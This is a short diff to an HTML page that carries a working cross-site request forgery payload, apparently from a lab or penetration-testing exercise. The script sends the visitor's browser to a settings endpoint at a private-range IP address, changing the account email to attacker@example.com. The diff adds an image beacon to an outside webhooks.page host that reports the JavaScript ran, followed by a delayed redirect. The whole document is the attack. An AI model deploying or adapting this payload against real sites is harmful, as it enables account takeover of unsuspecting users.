@@ -2,7 +2,12 @@
 <html>
 <body>
 <script>
-window.location = "http://100.101.228.35:6009/settings/email?new=attacker@example.com";
+var test = new Image();
+test.src = "https://006d396333124240a5a24829f6449a40.webhooks.page/?stage=javascript-executed";
+
+setTimeout(function() {
+    window.location = "http://100.101.228.35:6009/settings/email?new=attacker@example.com";
+}, 2000);
 </script>
 </body>
 </html>
